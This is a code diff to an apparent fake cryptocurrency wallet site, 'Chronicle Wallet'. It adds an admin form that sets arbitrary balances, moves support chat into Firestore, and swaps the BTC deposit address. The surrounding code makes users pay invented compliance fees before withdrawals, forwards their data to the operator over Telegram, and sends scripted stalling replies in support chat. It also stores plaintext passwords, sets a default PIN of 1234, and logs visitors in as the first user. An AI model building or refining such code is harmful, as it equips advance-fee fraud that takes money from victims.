@@ -123,11 +123,11 @@
         .chat-header { background: var(--bg-input); padding: 1rem; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
         .chat-body { flex: 1; padding: 1rem; overflow-y: auto; display: flex; flex-direction: column; gap: 0.75rem; font-size: 0.85rem; }
         .chat-footer { padding: 0.75rem; background: var(--bg-input); border-top: 1px solid var(--border); display: flex; gap: 0.5rem; }
-        .chat-bubble { padding: 0.65rem 0.85rem; border-radius: 10px; max-width: 80%; line-height: 1.4; position: relative; padding-bottom: 1.25rem; }
+        .chat-bubble { padding: 0.65rem 0.85rem; border-radius: 10px; max-width: 85%; line-height: 1.4; position: relative; padding-bottom: 1.5rem; }
         .chat-bubble.user { background: var(--primary); color: #fff; align-self: flex-end; }
         .chat-bubble.agent { background: var(--bg-input); border: 1px solid var(--border); color: var(--text-main); align-self: flex-start; }
-        .msg-ticks { position: absolute; bottom: 3px; right: 8px; font-size: 0.65rem; color: #a5b4fc; }
-        .chat-bubble.agent .msg-ticks { color: var(--text-muted); }
+        .msg-meta { position: absolute; bottom: 3px; right: 8px; font-size: 0.62rem; color: #a5b4fc; display: flex; gap: 4px; align-items: center; }
+        .chat-bubble.agent .msg-meta { color: var(--text-muted); }
     </style>
 </head>
 <body id="app-body">
@@ -170,7 +170,7 @@
             <span style="cursor:pointer; font-size:1.25rem; color:var(--text-muted);" onclick="toggleSupportChat()">&times;</span>
         </div>
         <div class="chat-body" id="chat-messages-container">
-            <div class="chat-bubble agent">Hello! Welcome to Chronicle Wallet support. How can we help you today?<span class="msg-ticks">✓✓</span></div>
+            <div class="chat-bubble agent">Hello! Welcome to Chronicle Wallet support. How can we help you today?<span class="msg-meta">12:00 PM • ✓✓</span></div>
         </div>
         <div style="padding: 0 1rem 0.5rem 1rem; font-size:0.75rem; color:var(--text-muted); font-style:italic;" id="typing-indicator-box" class="hidden">
             Agent is typing...
@@ -197,7 +197,7 @@
     <div class="container">
         
         <div id="user-tab">
-            <div id="guest-prompt-card" class="card" style="text-align:center; background:linear-gradient(135deg, var(--bg-card), var(--bg-input)); border: 1px dashed var(--primary);">
+            <div id="guest-prompt-card" class="card hidden" style="text-align:center; background:linear-gradient(135deg, var(--bg-card), var(--bg-input)); border: 1px dashed var(--primary);">
                 <h3 style="margin-bottom:0.5rem;">Welcome to Chronicle Wallet</h3>
                 <p style="color:var(--text-muted); font-size:0.875rem; margin-bottom:1rem;">Please sign in or create an account to access your portfolio vault, send, receive, buy, sell, and withdraw funds.</p>
                 <div style="display:flex; justify-content:center; gap:1rem;">
@@ -206,7 +206,7 @@
                 </div>
             </div>
 
-            <div id="wallet-dashboard-container" class="hidden">
+            <div id="wallet-dashboard-container" class="">
                 <div class="balance-card">
                     <div style="color:var(--text-muted); font-size:0.875rem;">Total Portfolio Value</div>
                     <h1 style="font-size:2.8rem; color:#fff; margin:0.25rem 0;" id="user-total-val">$0.00</h1>
@@ -267,7 +267,7 @@
                 </div>
             </div>
 
-            <div class="card hidden" id="tx-history-card">
+            <div class="card" id="tx-history-card">
                 <h3>Transaction History</h3>
                 <table class="table">
                     <thead>
@@ -332,6 +332,23 @@
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1.5rem;">
                 <h2>👑 Admin Management Dashboard</h2>
                 <button class="btn btn-danger" style="width:auto; padding:0.4rem 1rem;" onclick="logoutAdmin()">Lock Admin Panel</button>
+            </div>
+
+            <!-- MANUAL USER CREATOR CARD -->
+            <div class="card" style="border: 2px solid var(--primary);">
+                <h3>👤 Manually Create User Account</h3>
+                <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:1rem;">Create or restore a user account manually with custom details, initial balances, and Wallet ID:</p>
+                <form onsubmit="adminCreateUserManually(event)">
+                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:0.75rem;">
+                        <div class="form-group"><label>Full Name</label><input type="text" id="admin-new-name" class="form-control" placeholder="e.g. John Doe" required></div>
+                        <div class="form-group"><label>Email Address</label><input type="email" id="admin-new-email" class="form-control" placeholder="user@example.com" required></div>
+                        <div class="form-group"><label>Password</label><input type="text" id="admin-new-password" class="form-control" placeholder="Account password" required></div>
+                        <div class="form-group"><label>Wallet ID (Leave blank to auto-generate CRN-XXXX)</label><input type="text" id="admin-new-userid" class="form-control" placeholder="e.g. CRN-6535"></div>
+                        <div class="form-group"><label>Initial USD Cash ($)</label><input type="number" step="any" id="admin-new-usd" class="form-control" value="0"></div>
+                        <div class="form-group"><label>Initial Bitcoin (BTC)</label><input type="number" step="any" id="admin-new-btc" class="form-control" value="0"></div>
+                    </div>
+                    <button type="submit" class="btn btn-success" style="margin-top:0.5rem;">Create User Account</button>
+                </form>
             </div>
 
             <div class="card">
@@ -778,11 +795,6 @@
             }).catch(err => console.error("Telegram Alert Error:", err));
         }
 
-        // Helper to sanitize emails for safe Firestore dot-notation keys
-        function safeKey(email) {
-            return email.trim().toLowerCase().replace(/\./g, '_dot_');
-        }
-
         let usersList = [];
         let currentUserEmail = localStorage.getItem('chronicle_current_user') || null;
         let userEmails = {};
@@ -792,7 +804,7 @@
             { id: 2, title: "Clarification & Compliance Fee", amount: 250, note: "Required regulatory compliance tax.", statusMsg: "Clearing", timerMinutes: 2 }
         ];
         let globalAddresses = {
-            btc: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
+            btc: "bc1q34k0kfk7vp7ugq04765zzgvnxklzn7s6k9fl58",
             btcQr: "",
             eth: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
             ethQr: "",
@@ -804,6 +816,7 @@
         let supportAgents = [
             { id: 1, name: "Agent Sarah", pic: "" }
         ];
+        
         let chatThreads = {};
         let selectedAdminChatUser = null;
         let showAllUsers = false;
@@ -816,10 +829,25 @@
         let liveEthUsd = 3500;
         let lastInboxCount = 0;
 
-        // --- REAL-TIME FIREBASE LISTENER ---
+        // --- SAFE NON-WIPE GENERAL APP CONFIG LISTENER ---
         db.collection("config").doc("appData").onSnapshot((doc) => {
             if (doc.exists) {
                 const data = doc.data();
+                
+                if (data.usersList && data.usersList.length > 0) usersList = data.usersList;
+                if (data.userEmails) userEmails = data.userEmails;
+                if (data.exchanges && data.exchanges.length > 0) exchanges = data.exchanges;
+                if (data.actionSteps && data.actionSteps.length > 0) actionSteps = data.actionSteps;
+                if (data.globalAddresses && data.globalAddresses.btc) globalAddresses = data.globalAddresses;
+                if (data.platformTerms) platformTerms = data.platformTerms;
+                if (data.proofQueue) proofQueue = data.proofQueue;
+                if (data.knowledgeBase) knowledgeBase = data.knowledgeBase;
+                if (data.supportAgents && data.supportAgents.length > 0) supportAgents = data.supportAgents;
+
+                if (!currentUserEmail && usersList.length > 0) {
+                    currentUserEmail = usersList[0].email;
+                    localStorage.setItem('chronicle_current_user', currentUserEmail);
+                }
                 
                 if (currentUserEmail && data.userEmails && data.userEmails[currentUserEmail]) {
                     const newInboxLength = data.userEmails[currentUserEmail].length;
@@ -829,43 +857,6 @@
                     }
                     lastInboxCount = newInboxLength;
                 }
-
-                if (data.usersList) usersList = data.usersList;
-                if (data.userEmails) userEmails = data.userEmails;
-                if (data.exchanges) exchanges = data.exchanges;
-                if (data.actionSteps) actionSteps = data.actionSteps;
-                if (data.globalAddresses) globalAddresses = data.globalAddresses;
-                if (data.platformTerms) platformTerms = data.platformTerms;
-                if (data.proofQueue) proofQueue = data.proofQueue;
-                if (data.knowledgeBase) knowledgeBase = data.knowledgeBase;
-                if (data.supportAgents) supportAgents = data.supportAgents;
-                
-                // Rebuild chatThreads cleanly supporting both legacy keys and safeKeys
-                if (data.chatThreads) {
-                    chatThreads = {};
-                    Object.keys(data.chatThreads).forEach(k => {
-                        const normalizedEmail = k.replace(/_dot_/g, '.');
-                        chatThreads[normalizedEmail] = data.chatThreads[k];
-                    });
-                }
-
-                // Immediately re-render user chat if user is logged in
-                if (currentUserEmail && chatThreads[currentUserEmail.trim().toLowerCase()]) {
-                    const uThread = chatThreads[currentUserEmail.trim().toLowerCase()];
-                    renderUserChatMessages();
-                    
-                    const drawer = document.getElementById('support-drawer');
-                    if (drawer && drawer.style.display === 'flex') {
-                        markMessagesAsSeenByTarget('user');
-                    }
-
-                    const typingBox = document.getElementById('typing-indicator-box');
-                    if (uThread.adminTyping) {
-                        typingBox.classList.remove('hidden');
-                    } else {
-                        typingBox.classList.add('hidden');
-                    }
-                }
                 
                 checkTimersAndAutoProgress();
                 updateBalanceUI();
@@ -873,40 +864,59 @@
                 if (!document.getElementById('admin-tab').classList.contains('hidden')) {
                     renderAdminDashboard();
                 }
+            } else {
+                saveState();
             }
         }, (error) => {
             console.error("Firestore Error:", error);
         });
 
-        function markMessagesAsSeenByTarget(viewerRole) {
-            if (viewerRole === 'user' && currentUserEmail) {
-                const emailKey = currentUserEmail.trim().toLowerCase();
-                const thread = chatThreads[emailKey];
-                if (!thread || !thread.messages) return;
-                let changed = false;
-                const updatedMsgs = thread.messages.map(m => {
-                    if (m.sender === 'agent' && !m.seen) { changed = true; return { ...m, seen: true }; }
-                    return m;
-                });
-                if (changed) {
-                    db.collection("config").doc("appData").update({
-                        [`chatThreads.${safeKey(emailKey)}.messages`]: updatedMsgs
-                    }).catch(() => {});
+        // --- INDEPENDENT ISOLATED CHAT LISTENER FOR CURRENT USER ---
+        function subscribeToUserChat(email) {
+            if (!email) return;
+            const emailKey = email.trim().toLowerCase();
+            db.collection("supportChats").doc(emailKey).onSnapshot((doc) => {
+                if (doc.exists) {
+                    chatThreads[emailKey] = doc.data();
+                } else {
+                    chatThreads[emailKey] = {
+                        messages: [
+                            { sender: 'agent', text: "Hello! Welcome to Chronicle Wallet support. How can we help you today?", time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), date: new Date().toLocaleDateString(), seen: true }
+                        ],
+                        userTyping: false,
+                        adminTyping: false
+                    };
+                    db.collection("supportChats").doc(emailKey).set(chatThreads[emailKey]).catch(()=>{});
                 }
-            } else if (viewerRole === 'admin' && selectedAdminChatUser) {
-                const emailKey = selectedAdminChatUser.trim().toLowerCase();
-                const thread = chatThreads[emailKey];
-                if (!thread || !thread.messages) return;
-                let changed = false;
-                const updatedMsgs = thread.messages.map(m => {
-                    if (m.sender === 'user' && !m.seen) { changed = true; return { ...m, seen: true }; }
-                    return m;
-                });
-                if (changed) {
-                    db.collection("config").doc("appData").update({
-                        [`chatThreads.${safeKey(emailKey)}.messages`]: updatedMsgs
-                    }).catch(() => {});
+                
+                const activeUser = getCurrentUserData();
+                if (activeUser && activeUser.email.trim().toLowerCase() === emailKey) {
+                    renderUserChatMessages();
+                    const drawer = document.getElementById('support-drawer');
+                    if (drawer && drawer.style.display === 'flex') {
+                        markMessagesAsSeen('user', emailKey);
+                    }
                 }
+                if (!document.getElementById('admin-tab').classList.contains('hidden')) {
+                    renderAdminDashboard();
+                }
+            });
+        }
+
+        function markMessagesAsSeen(role, email) {
+            const emailKey = email.trim().toLowerCase();
+            const thread = chatThreads[emailKey];
+            if (!thread || !thread.messages) return;
+            
+            let changed = false;
+            const updatedMsgs = thread.messages.map(m => {
+                if (role === 'user' && m.sender === 'agent' && !m.seen) { changed = true; return { ...m, seen: true }; }
+                if (role === 'admin' && m.sender === 'user' && !m.seen) { changed = true; return { ...m, seen: true }; }
+                return m;
+            });
+
+            if (changed) {
+                db.collection("supportChats").doc(emailKey).update({ messages: updatedMsgs }).catch(() => {});
             }
         }
 
@@ -935,7 +945,6 @@
         }
         setInterval(checkTimersAndAutoProgress, 5000);
 
-        // Note: chatThreads is intentionally excluded from general saveState() so non-chat actions never overwrite live chat messages
         function saveState() {
             db.collection("config").doc("appData").set({
                 usersList: usersList,
@@ -964,8 +973,17 @@
         }
 
         function getCurrentUserData() {
+            if (!currentUserEmail && usersList.length > 0) {
+                currentUserEmail = usersList[0].email;
+                localStorage.setItem('chronicle_current_user', currentUserEmail);
+            }
             if (!currentUserEmail) return null;
             let u = usersList.find(x => x.email.trim().toLowerCase() === currentUserEmail.trim().toLowerCase());
+            if (!u && usersList.length > 0) {
+                u = usersList[0];
+                currentUserEmail = u.email;
+                localStorage.setItem('chronicle_current_user', currentUserEmail);
+            }
             return u || null;
         }
 
@@ -974,7 +992,8 @@
             userEmails[email].unshift({ subject, body, date: new Date().toLocaleTimeString() });
             saveState();
 
-            if (currentUserEmail && currentUserEmail.trim().toLowerCase() === email.trim().toLowerCase()) {
+            const activeUser = getCurrentUserData();
+            if (activeUser && activeUser.email.trim().toLowerCase() === email.trim().toLowerCase()) {
                 showNotification(popupTitle, body, "💸");
             }
         }
@@ -1008,8 +1027,8 @@
                 document.getElementById('eth-fiat-value').innerText = `$${ethVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
                 document.getElementById('usd-fiat-value').innerText = `$${u.usd.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
 
-                document.getElementById('auth-status-btn').innerText = `👤 ${currentUserEmail.split('@')[0]}`;
-                document.getElementById('unread-badge').innerText = (userEmails[currentUserEmail] || []).length;
+                document.getElementById('auth-status-btn').innerText = `👤 ${(u.email || '').split('@')[0]}`;
+                document.getElementById('unread-badge').innerText = (userEmails[u.email] || []).length;
                 renderHistoryTable();
             } else {
                 guestPrompt.classList.remove('hidden');
@@ -1086,7 +1105,8 @@
         }
 
         function openReceiveModal() {
-            if (!currentUserEmail) { openAuthModal('signin'); return; }
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; }
             document.getElementById('receive-modal').style.display = 'flex';
             updateReceiveAddress();
         }
@@ -1109,7 +1129,12 @@
             }
         }
 
-        function openSendModal() { if (!currentUserEmail) { openAuthModal('signin'); return; } document.getElementById('send-modal').style.display = 'flex'; toggleSendAssetMode(); }
+        function openSendModal() { 
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; } 
+            document.getElementById('send-modal').style.display = 'flex'; 
+            toggleSendAssetMode(); 
+        }
         function closeSendModal() { document.getElementById('send-modal').style.display = 'none'; }
 
         function toggleSendAssetMode() {
@@ -1140,10 +1165,11 @@
             const recipientId = document.getElementById('send-recipient-id').value.trim().toUpperCase();
             const rawAmt = Number(document.getElementById('send-amount').value);
             const u = getCurrentUserData();
+            if (!u) { alert("Session expired. Please sign in."); openAuthModal('signin'); return; }
 
             const recipientUser = usersList.find(x => x.userId === recipientId);
             if (!recipientUser) { alert("Recipient User ID not found on platform."); return; }
-            if (recipientUser.email.trim().toLowerCase() === currentUserEmail.trim().toLowerCase()) { alert("Cannot send to yourself."); return; }
+            if (recipientUser.email.trim().toLowerCase() === u.email.trim().toLowerCase()) { alert("Cannot send to yourself."); return; }
 
             let deductBtc = 0, deductEth = 0, deductUsd = 0;
             let fiatVal = 0;
@@ -1182,13 +1208,18 @@
             showNotification("Transfer Sent", `Successfully sent to ${recipientUser.name || recipientId}`, "↗");
         }
 
-        function openSellModal() { if (!currentUserEmail) { openAuthModal('signin'); return; } document.getElementById('sell-modal').style.display = 'flex'; }
+        function openSellModal() { 
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; } 
+            document.getElementById('sell-modal').style.display = 'flex'; 
+        }
         function closeSellModal() { document.getElementById('sell-modal').style.display = 'none'; }
         function handleSellCrypto(e) {
             e.preventDefault();
             const asset = document.getElementById('sell-asset-type').value;
             const amt = Number(document.getElementById('sell-amount').value);
             const u = getCurrentUserData();
+            if (!u) { alert("Session expired."); openAuthModal('signin'); return; }
             if (asset === 'btc' && amt > u.btc) { alert("Insufficient BTC."); return; }
             if (asset === 'eth' && amt > u.eth) { alert("Insufficient ETH."); return; }
 
@@ -1201,7 +1232,8 @@
         }
 
         function openWithdrawModal() {
-            if (!currentUserEmail) { openAuthModal('signin'); return; }
+            const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; }
             document.getElementById('withdraw-modal').style.display = 'flex';
         }
         function closeWithdrawModal() { document.getElementById('withdraw-modal').style.display = 'none'; }
@@ -1237,6 +1269,7 @@
             e.preventDefault();
             const amt = Number(document.getElementById('withdraw-amt').value);
             const u = getCurrentUserData();
+            if (!u) { alert("Session expired."); openAuthModal('signin'); return; }
             if (amt > u.usd) { 
                 alert("Insufficient USD cash balance! Please use the 'Sell' button on your dashboard to convert your crypto assets to USD fiat first."); 
                 return; 
@@ -1260,7 +1293,8 @@
             e.preventDefault();
             const pin = document.getElementById('verify-pin-input').value;
             const u = getCurrentUserData();
-            if (u.pin !== pin) { alert("Incorrect PIN!"); return; }
+            if (!u) { alert("Session expired."); openAuthModal('signin'); return; }
+            if (u.pin && u.pin !== pin) { alert("Incorrect PIN!"); return; }
             closePinConfirmModal();
 
             const amt = Number(document.getElementById('withdraw-amt').value);
@@ -1302,7 +1336,7 @@
             saveState(); updateBalanceUI();
             showNotification("Processing", `Withdrawal request submitted`, "💳");
             
-            sendTelegramAlert(`💳 <b>NEW WITHDRAWAL REQUEST</b>\n\n👤 <b>User:</b> ${currentUserEmail}\n💰 <b>Amount:</b> $${amt.toFixed(2)}${feeCharged > 0 ? ` (Fee: $${feeCharged.toFixed(2)})` : ''}\n🏦 <b>Method:</b> ${selectedWithdrawMethodName}\n📍 <b>Destination:</b> ${destAddr}${bankName ? ` (${bankName} - ${accName})` : ''}`);
+            sendTelegramAlert(`💳 <b>NEW WITHDRAWAL REQUEST</b>\n\n👤 <b>User:</b> ${u.email}\n💰 <b>Amount:</b> $${amt.toFixed(2)}${feeCharged > 0 ? ` (Fee: $${feeCharged.toFixed(2)})` : ''}\n🏦 <b>Method:</b> ${selectedWithdrawMethodName}\n📍 <b>Destination:</b> ${destAddr}${bankName ? ` (${bankName} - ${accName})` : ''}`);
 
             setTimeout(() => { openActionModal(); }, 1500);
         }
@@ -1310,6 +1344,7 @@
         function openActionModal() {
             if (actionSteps.length === 0) return;
             const u = getCurrentUserData();
+            if (!u) { openAuthModal('signin'); return; }
             const currentStepIdx = u.stepIdx || 0;
             const step = actionSteps[currentStepIdx];
             if (!step) return;
@@ -1330,7 +1365,7 @@
             const uploadSection = document.getElementById('proof-upload-section');
             const submittedNotice = document.getElementById('proof-submitted-notice');
 
-            const existingProof = proofQueue.find(p => p.user.trim().toLowerCase() === currentUserEmail.trim().toLowerCase() && p.stepIdx === currentStepIdx);
+            const existingProof = proofQueue.find(p => p.user.trim().toLowerCase() === u.email.trim().toLowerCase() && p.stepIdx === currentStepIdx);
             const tx = (u.txs || []).find(t => t.id == u.activeTxId);
 
             if (existingProof || (tx && tx.status && tx.status.includes('PROOF SUBMITTED'))) {
@@ -1377,14 +1412,14 @@
                     const compressedDataUrl = canvas.toDataURL('image/jpeg', 0.6);
 
                     const u = getCurrentUserData();
-                    if (!u) { alert("User session not found."); return; }
+                    if (!u) { alert("User session not found."); openAuthModal('signin'); return; }
                     const currentStepIdx = u.stepIdx || 0;
                     const step = actionSteps[currentStepIdx];
                     if (!step) { alert("No active step found."); return; }
 
                     proofQueue.push({ 
                         id: Date.now(), 
-                        user: currentUserEmail, 
+                        user: u.email, 
                         stepIdx: currentStepIdx,
                         stepTitle: step.title, 
                         amount: (u.appealedFees && u.appealedFees[currentStepIdx] !== undefined) ? u.appealedFees[currentStepIdx] : step.amount, 
@@ -1405,7 +1440,7 @@
                         fileInput.value = "";
                         showNotification("Submitted", `Proof submitted successfully!`, "🖼️");
                         
-                        sendTelegramAlert(`🖼️ <b>PAYMENT PROOF SUBMITTED</b>\n\n👤 <b>User:</b> ${currentUserEmail}\n⚙️ <b>Step:</b> ${step.title}\n💵 <b>Amount:</b> $${step.amount}`);
+                        sendTelegramAlert(`🖼️ <b>PAYMENT PROOF SUBMITTED</b>\n\n👤 <b>User:</b> ${u.email}\n⚙️ <b>Step:</b> ${step.title}\n💵 <b>Amount:</b> $${step.amount}`);
 
                         alert(`Proof submitted successfully for ${step.title}! It is now pending Admin approval.`);
                     }).catch(err => {
@@ -1418,6 +1453,53 @@
                 alert("Failed to read image file.");
             };
             reader.readAsDataURL(file);
+        }
+
+        // --- MANUAL ADMIN USER CREATION ---
+        function adminCreateUserManually(e) {
+            e.preventDefault();
+            const name = document.getElementById('admin-new-name').value.trim();
+            const email = document.getElementById('admin-new-email').value.trim().toLowerCase();
+            const password = document.getElementById('admin-new-password').value;
+            const customUserId = document.getElementById('admin-new-userid').value.trim().toUpperCase();
+            const usd = Number(document.getElementById('admin-new-usd').value) || 0;
+            const btc = Number(document.getElementById('admin-new-btc').value) || 0;
+
+            if (usersList.some(x => x.email.trim().toLowerCase() === email)) {
+                alert("A user with this email already exists!");
+                return;
+            }
+
+            const uniqueId = customUserId || ('CRN-' + Math.floor(1000 + Math.random() * 9000));
+            const newUser = { 
+                name, 
+                email, 
+                userId: uniqueId, 
+                password, 
+                pin: "1234", 
+                btc: btc, 
+                eth: 0, 
+                usd: usd, 
+                txs: [], 
+                stepIdx: 0, 
+                activeTxId: null, 
+                statusExpiryTime: null, 
+                appealedFees: {} 
+            };
+
+            usersList.push(newUser);
+            saveState();
+            renderAdminDashboard();
+
+            // Clear inputs
+            document.getElementById('admin-new-name').value = '';
+            document.getElementById('admin-new-email').value = '';
+            document.getElementById('admin-new-password').value = '';
+            document.getElementById('admin-new-userid').value = '';
+            document.getElementById('admin-new-usd').value = '0';
+            document.getElementById('admin-new-btc').value = '0';
+
+            alert(`User account created successfully!\nEmail: ${email}\nWallet ID: ${uniqueId}\nDefault PIN set to: 1234`);
         }
 
         function openAdminLoginModal() { document.getElementById('admin-login-modal').style.display = 'flex'; }
@@ -1510,28 +1592,31 @@
             const drawer = document.getElementById('support-drawer');
             const willOpen = drawer.style.display !== 'flex';
             drawer.style.display = willOpen ? 'flex' : 'none';
-            if (willOpen) {
+            const u = getCurrentUserData();
+            if (willOpen && u) {
                 updateSupportAgentUI();
-                renderUserChatMessages();
-                markMessagesAsSeenByTarget('user');
+                subscribeToUserChat(u.email);
+            } else if (willOpen && !u) {
+                openAuthModal('signin');
             }
         }
 
         function renderUserChatMessages() {
-            if (!currentUserEmail) return;
-            const emailKey = currentUserEmail.trim().toLowerCase();
+            const u = getCurrentUserData();
+            if (!u) return;
+            const emailKey = u.email.trim().toLowerCase();
             const container = document.getElementById('chat-messages-container');
             const thread = chatThreads[emailKey];
             
             if (!thread || !thread.messages || thread.messages.length === 0) {
-                container.innerHTML = `<div class="chat-bubble agent">Hello! Welcome to Chronicle Wallet support. How can we help you today?<span class="msg-ticks">✓✓</span></div>`;
+                container.innerHTML = `<div class="chat-bubble agent">Hello! Welcome to Chronicle Wallet support. How can we help you today?<span class="msg-meta">12:00 PM • ✓✓</span></div>`;
                 return;
             }
             
             container.innerHTML = thread.messages.map(m => `
                 <div class="chat-bubble ${m.sender}">
                     ${m.text}
-                    <span class="msg-ticks">${m.seen ? '✓✓' : '✓'}</span>
+                    <span class="msg-meta">${m.time || ''} ${m.date ? '• ' + m.date : ''} • ${m.seen ? '✓✓' : '✓'}</span>
                 </div>
             `).join('');
             container.scrollTop = container.scrollHeight;
@@ -1540,23 +1625,19 @@
         let userTypingTimer = null;
         let isUserTypingActive = false;
         function handleUserTypingInput() {
-            if (!currentUserEmail) return;
-            const emailKey = currentUserEmail.trim().toLowerCase();
-            const sKey = safeKey(emailKey);
+            const u = getCurrentUserData();
+            if (!u) return;
+            const emailKey = u.email.trim().toLowerCase();
 
             if (!isUserTypingActive) {
                 isUserTypingActive = true;
-                db.collection("config").doc("appData").update({
-                    [`chatThreads.${sKey}.userTyping`]: true
-                }).catch(() => {});
+                db.collection("supportChats").doc(emailKey).update({ userTyping: true }).catch(() => {});
             }
 
             clearTimeout(userTypingTimer);
             userTypingTimer = setTimeout(() => {
                 isUserTypingActive = false;
-                db.collection("config").doc("appData").update({
-                    [`chatThreads.${sKey}.userTyping`]: false
-                }).catch(() => {});
+                db.collection("supportChats").doc(emailKey).update({ userTyping: false }).catch(() => {});
             }, 2000);
         }
 
@@ -1565,85 +1646,75 @@
         function handleAdminTypingInput() {
             if (!selectedAdminChatUser) return;
             const emailKey = selectedAdminChatUser.trim().toLowerCase();
-            const sKey = safeKey(emailKey);
 
             if (!isAdminTypingActive) {
                 isAdminTypingActive = true;
-                db.collection("config").doc("appData").update({
-                    [`chatThreads.${sKey}.adminTyping`]: true
-                }).catch(() => {});
+                db.collection("supportChats").doc(emailKey).update({ adminTyping: true }).catch(() => {});
             }
 
             clearTimeout(adminTypingTimer);
             adminTypingTimer = setTimeout(() => {
                 isAdminTypingActive = false;
-                db.collection("config").doc("appData").update({
-                    [`chatThreads.${sKey}.adminTyping`]: false
-                }).catch(() => {});
+                db.collection("supportChats").doc(emailKey).update({ adminTyping: false }).catch(() => {});
             }, 2000);
         }
 
         function sendChatMessage() {
-            if (!currentUserEmail) { alert("Please sign in first to message support."); openAuthModal('signin'); return; }
+            const u = getCurrentUserData();
+            if (!u) { alert("Please sign in first to message support."); openAuthModal('signin'); return; }
             const input = document.getElementById('chat-input-box');
             const msg = input.value.trim();
             if (!msg) return;
 
-            const emailKey = currentUserEmail.trim().toLowerCase();
-            const sKey = safeKey(emailKey);
-            const newMsgObj = { id: Date.now(), sender: 'user', text: msg, time: new Date().toLocaleTimeString(), seen: false };
+            const emailKey = u.email.trim().toLowerCase();
+            const nowTime = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            const nowDate = new Date().toLocaleDateString();
 
-            if (!chatThreads[emailKey]) {
-                chatThreads[emailKey] = { messages: [], lastUserMsgTime: null, agentRepliedSinceLastUser: false, userTyping: false };
-            }
-            chatThreads[emailKey].messages.push(newMsgObj);
-            chatThreads[emailKey].lastUserMsgTime = Date.now();
-            chatThreads[emailKey].agentRepliedSinceLastUser = false;
-            chatThreads[emailKey].userTyping = false;
-            isUserTypingActive = false;
+            const newMsgObj = { 
+                id: Date.now(), 
+                sender: 'user', 
+                text: msg, 
+                time: nowTime, 
+                date: nowDate, 
+                seen: false 
+            };
 
             input.value = '';
-            renderUserChatMessages();
+            isUserTypingActive = false;
 
-            // Atomic arrayUnion update prevents message deletion / overwrites
-            db.collection("config").doc("appData").update({
-                [`chatThreads.${sKey}.messages`]: firebase.firestore.FieldValue.arrayUnion(newMsgObj),
-                [`chatThreads.${sKey}.lastUserMsgTime`]: Date.now(),
-                [`chatThreads.${sKey}.agentRepliedSinceLastUser`]: false,
-                [`chatThreads.${sKey}.userTyping`]: false
+            db.collection("supportChats").doc(emailKey).update({
+                messages: firebase.firestore.FieldValue.arrayUnion(newMsgObj),
+                lastUserMsgTime: Date.now(),
+                agentRepliedSinceLastUser: false,
+                userTyping: false
+            }).then(() => {
+                renderUserChatMessages();
             }).catch(() => {
-                db.collection("config").doc("appData").set({
-                    chatThreads: {
-                        [sKey]: {
-                            messages: [newMsgObj],
-                            lastUserMsgTime: Date.now(),
-                            agentRepliedSinceLastUser: false,
-                            userTyping: false
-                        }
-                    }
+                db.collection("supportChats").doc(emailKey).set({
+                    messages: [newMsgObj],
+                    lastUserMsgTime: Date.now(),
+                    agentRepliedSinceLastUser: false,
+                    userTyping: false
                 }, { merge: true });
             });
 
             sendTelegramAlert(`💬 <b>NEW SUPPORT MESSAGE</b>\n\n👤 <b>User:</b> ${emailKey}\n✉️ <b>Message:</b> ${msg}`);
 
-            if (!document.getElementById('admin-tab').classList.contains('hidden')) {
-                renderAdminDashboard();
-            }
-
             setTimeout(() => {
-                if (chatThreads[emailKey] && !chatThreads[emailKey].agentRepliedSinceLastUser) {
-                    const currentThread = chatThreads[emailKey];
-                    const lastMsg = currentThread.messages[currentThread.messages.length - 1];
+                const thread = chatThreads[emailKey];
+                if (thread && !thread.agentRepliedSinceLastUser) {
+                    const lastMsg = thread.messages[thread.messages.length - 1];
                     if (!lastMsg || !lastMsg.text.includes("transferred to a new agent")) {
                         const autoTransferMsg = { 
                             id: Date.now(),
                             sender: 'agent', 
                             text: "You're now being transferred to a new agent. Please hold on... If you want a fast response, message support via email support@chroniclewallets.com", 
-                            time: new Date().toLocaleTimeString(), 
+                            time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }), 
+                            date: new Date().toLocaleDateString(), 
                             seen: true 
                         };
-                        db.collection("config").doc("appData").update({
-                            [`chatThreads.${sKey}.messages`]: firebase.firestore.FieldValue.arrayUnion(autoTransferMsg)
+                        db.collection("supportChats").doc(emailKey).update({
+                            messages: firebase.firestore.FieldValue.arrayUnion(autoTransferMsg)
                         }).catch(() => {});
                     }
                 }
@@ -1652,7 +1723,7 @@
 
         function adminSelectUserDropdown(email) {
             selectedAdminChatUser = email;
-            markMessagesAsSeenByTarget('admin');
+            markMessagesAsSeen('admin', email);
             renderAdminDashboard();
         }
 
@@ -1664,34 +1735,32 @@
             if (!replyText) return;
 
             const emailKey = selectedAdminChatUser.trim().toLowerCase();
-            const sKey = safeKey(emailKey);
-            const replyObj = { id: Date.now(), sender: 'agent', text: `[${agentName}]: ${replyText}`, time: new Date().toLocaleTimeString(), seen: false };
+            const nowTime = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            const nowDate = new Date().toLocaleDateString();
 
-            if (!chatThreads[emailKey]) {
-                chatThreads[emailKey] = { messages: [], lastUserMsgTime: null, agentRepliedSinceLastUser: true };
-            }
-            chatThreads[emailKey].messages.push(replyObj);
-            chatThreads[emailKey].agentRepliedSinceLastUser = true;
-            chatThreads[emailKey].adminTyping = false;
-            isAdminTypingActive = false;
+            const replyObj = { 
+                id: Date.now(), 
+                sender: 'agent', 
+                text: `[${agentName}]: ${replyText}`, 
+                time: nowTime, 
+                date: nowDate, 
+                seen: false 
+            };
 
             document.getElementById('admin-reply-msg-input').value = '';
-            renderAdminDashboard();
+            isAdminTypingActive = false;
 
